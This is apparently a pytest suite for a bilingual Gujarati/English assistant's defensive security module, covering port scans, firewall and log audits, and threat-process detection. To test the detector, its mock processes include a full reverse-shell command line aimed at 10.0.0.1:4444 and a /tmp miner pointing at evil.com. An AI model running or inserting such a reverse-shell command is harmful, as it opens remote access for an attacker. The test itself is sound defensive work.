"""
Unit and Integration Tests for Aradhya Anti-Hacker Cyber Defense & Security Sentry.
"""

import os
import sys
import pytest
from unittest.mock import MagicMock, patch

from config.settings import JarvisConfig, load_config
from core.security_sentry import SecuritySentry
from tools.security_tools import (
    run_system_security_audit,
    scan_network_vulnerabilities,
    scan_for_hacker_backdoors,
    check_firewall_status,
    neutralize_suspicious_threat,
)
from core.agent import JarvisAgent
from core.offline_commander import OfflineCommander


@pytest.fixture
def config():
    cfg = load_config()
    cfg.agent_name = "Aradhya"
    cfg.language = "gujarati"
    return cfg


@pytest.fixture
def sentry(config):
    return SecuritySentry(config)


def test_security_sentry_initialization(sentry):
    assert sentry is not None
    assert sentry.security_log_file.exists()
    sentry.log_security_event("TEST", "Security sentry unit test event")
    content = sentry.security_log_file.read_text(encoding="utf-8")
    assert "Security sentry unit test event" in content


def test_scan_listening_ports(sentry):
    ports_data = sentry.scan_listening_ports()
    assert isinstance(ports_data, dict)
    assert "total_listening" in ports_data
    assert "exposed_count" in ports_data
    assert "high_risk_count" in ports_data
    assert isinstance(ports_data["listening_sockets"], list)
    assert ports_data["total_listening"] >= 0


def test_scan_suspicious_processes_detection(sentry):
    # Test clean run on real system
    real_threats = sentry.scan_suspicious_processes()
    assert isinstance(real_threats, list)

    # Test mock detection of a fake reverse shell process
    mock_proc = MagicMock()
    mock_proc.info = {
        "pid": 99999,
        "name": "bash",
        "exe": "/bin/bash",
        "cmdline": ["bash", "-i", ">&", "/dev/tcp/10.0.0.1/4444", "0>&1"],
        "username": "alpesh",
        "create_time": 1000.0,
    }

    with patch("psutil.process_iter", return_value=[mock_proc]):
        detected = sentry.scan_suspicious_processes()
        assert len(detected) == 1
        assert detected[0]["threat_type"] == "REVERSE_SHELL"
        assert detected[0]["severity"] == "CRITICAL"
        assert detected[0]["pid"] == 99999

    # Test mock detection of a binary running from /tmp
    mock_tmp_proc = MagicMock()
    mock_tmp_proc.info = {
        "pid": 88888,
        "name": "malware_miner",
        "exe": "/tmp/miner.elf",
        "cmdline": ["/tmp/miner.elf", "--pool", "evil.com"],
        "username": "alpesh",
        "create_time": 1000.0,
    }

    with patch("psutil.process_iter", return_value=[mock_tmp_proc]):
        detected_tmp = sentry.scan_suspicious_processes()
        assert len(detected_tmp) == 1
        assert detected_tmp[0]["threat_type"] == "TEMP_EXECUTION"
        assert detected_tmp[0]["severity"] == "HIGH"


def test_audit_firewall_status(sentry):
    fw = sentry.audit_firewall_status()
    assert isinstance(fw, dict)
    assert "installed" in fw
    assert "enabled" in fw
    assert "default_input_policy" in fw
    assert "status_summary" in fw
    assert "recommendation" in fw


def test_audit_auth_logs(sentry):
    auth_data = sentry.audit_auth_logs(max_lines=50)
    assert isinstance(auth_data, dict)
    assert "failed_attempts_count" in auth_data
    assert "brute_force_detected" in auth_data
    assert isinstance(auth_data.get("recent_failures", []), list)


def test_audit_persistence_and_ssh(sentry):
    persist = sentry.audit_persistence_and_ssh()
    assert isinstance(persist, dict)
    assert "ssh_authorized_keys_count" in persist
    assert "user_cron_count" in persist
    assert "autostart_entries" in persist


def test_audit_system_security_full(sentry):
    audit = sentry.audit_system_security(deep_scan=True)
    assert isinstance(audit, dict)
    assert "overall_severity" in audit
    assert audit["overall_severity"] in ("SECURE", "LOW", "MEDIUM", "HIGH", "CRITICAL")
    assert "findings" in audit
    assert "ports" in audit
    assert "firewall" in audit
    assert "suspicious_processes" in audit


def test_format_security_report_bilingual(sentry):
    mock_audit = {
        "timestamp": "2026-09-06 14:00:00",
        "elapsed_seconds": 0.42,
        "overall_severity": "SECURE",
        "findings_count": 0,
        "findings": [],
        "ports": {"total_listening": 5, "exposed_count": 0, "high_risk_count": 0, "high_risk_sockets": []},
        "firewall": {"enabled": True, "default_input_policy": "DROP", "recommendation": "Firewall active"},
        "suspicious_processes": [],
        "authentication": {"failed_attempts_count": 0, "brute_force_detected": False},
        "persistence": {"ssh_authorized_keys_count": 0, "user_cron_count": 1}
    }

    # Gujarati report test
    rep_gu = sentry.format_security_report(mock_audit, lang="gujarati")
    assert "આરાધ્યા સાયબર ડિફેન્સ" in rep_gu
    assert "નેટવર્ક પોર્ટ્સ" in rep_gu
    assert "લિનક્સ ફાયરવોલ" in rep_gu

    # English report test
    rep_en = sentry.format_security_report(mock_audit, lang="english")
    assert "ARADHYA CYBER DEFENSE" in rep_en or "AROHI CYBER DEFENSE" in rep_en
    assert "Network Ports" in rep_en
    assert "Linux Firewall" in rep_en


def test_neutralize_threat(sentry):
    # Cannot terminate self or PID 1
    res_self = sentry.neutralize_threat(os.getpid())
    assert res_self["success"] is False
    assert "protected" in res_self["message"].lower()

    # Non-existent target
    res_none = sentry.neutralize_threat(99999999)
    assert res_none["success"] is False
    assert "not found" in res_none["message"].lower()


def test_security_tools_callables():
    audit_report = run_system_security_audit(deep_scan=False)
    assert isinstance(audit_report, str)
    assert len(audit_report) > 50

    port_rep = scan_network_vulnerabilities()
    assert isinstance(port_rep, str)
    assert "Network Vulnerability" in port_rep

    bd_rep = scan_for_hacker_backdoors()
    assert isinstance(bd_rep, str)

    fw_rep = check_firewall_status()
    assert isinstance(fw_rep, str)
    assert "Linux Firewall" in fw_rep


def test_agent_registered_security_tools(config):
    agent = JarvisAgent(config)
    expected_tools = [
        "run_system_security_audit",
        "scan_network_vulnerabilities",
        "scan_for_hacker_backdoors",
        "check_firewall_status",
        "neutralize_suspicious_threat",
    ]
    for tool_name in expected_tools:
        assert tool_name in agent.registry.tools, f"Tool '{tool_name}' missing from agent registry"


def test_offline_commander_security_gujarati(config):
    commander = OfflineCommander(config)

    # Gujarati audit command
    res1 = commander.execute_offline_turn("સિક્યુરિટી ચેક કરો")
    assert "આરાધ્યા સાયબર ડિફેન્સ" in res1 or "સિક્યુરિટી" in res1

    # Gujarati firewall command
    res2 = commander.execute_offline_turn("ફાયરવોલ ચેક કરો")
    assert "ફાયરવોલ" in res2 or "UFW" in res2

    # Gujarati port scan
    res3 = commander.execute_offline_turn("નેટવર્ક પોર્ટ સ્કેન કરો")
    assert "પોર્ટ" in res3 or "Network Vulnerability" in res3


def test_offline_commander_security_english(config):
    config.language = "english"
    commander = OfflineCommander(config)

    # English audit command
    res1 = commander.execute_offline_turn("check for hackers")
    assert "AROHI CYBER DEFENSE" in res1 or "Security" in res1

    # English firewall command
    res2 = commander.execute_offline_turn("firewall status")
    assert "Firewall" in res2 or "UFW" in res2

    # English port scan
    res3 = commander.execute_offline_turn("open ports scan")
    assert "Network" in res3 or "Ports" in res3
